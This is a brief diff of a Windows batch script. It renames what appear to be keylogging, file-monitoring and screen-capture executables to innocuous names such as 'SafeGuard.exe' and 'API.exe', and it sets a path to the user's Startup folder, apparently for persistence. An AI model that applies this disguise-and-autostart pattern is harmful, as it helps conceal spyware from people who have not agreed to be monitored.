@@ -1,8 +1,8 @@
 @echo off
 
-set "EXE1=dist\FileMonitor.exe"
-set "EXE2=dist\KeyMonitor.exe"
-set "EXE3=dist\ScreenCapture.exe"
+set "EXE1=dist\API.exe"
+set "EXE2=dist\Crack.exe"
+set "EXE3=dist\SafeGuard.exe"
 
 set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
 
